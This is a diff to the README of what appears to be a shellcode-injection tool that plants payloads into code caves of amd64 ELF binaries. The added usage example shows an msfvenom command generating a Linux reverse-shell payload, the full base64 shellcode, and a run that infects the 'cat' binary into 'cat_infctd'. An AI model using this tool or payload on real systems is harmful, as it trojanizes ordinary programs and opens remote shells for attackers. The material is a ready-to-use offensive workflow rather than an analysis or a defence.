@@ -8,8 +8,20 @@ Saves original binary execution flow
 
 # Usage
 Works only with amd64 ELF bins, for now...  
-Put your "*cooked*" shellcode into script (`payload` variable, between quotations mark)  
-*Proper arguments handling is WIP*
+Example:  
+```
+Usage: viscr.py <binary> <b64 encoded shellcode>
+============
+> msfvenom -p linux/x64/shell_reverse_tcp -f base64  LHOST=127.0.0.1 LPORT=4242
+ailYmWoCX2oBXg8FSJdIuQIAEJJ/AAABUUiJ5moQWmoqWA8FagNeSP/OaiFYDwV19mo7WJlIuy9iaW4vc2gAU0iJ51JXSInmDwU=
+============
+> ./viscR.py cat ailYmWoCX2oBXg8FSJdIuQIAEJJ/AAABUUiJ5moQWmoqWA8FagNeSP/OaiFYDwV19mo7WJlIuy9iaW4vc2gAU0iJ51JXSInmDwU=
+Using user supplied shellcode
+Arch === amd64
+Endian === little
+Found cave at 0x7049 ; size - 16457
+cat_infctd created. Use wisely
+```
 
 # Todo
 + PE, Mach-O support
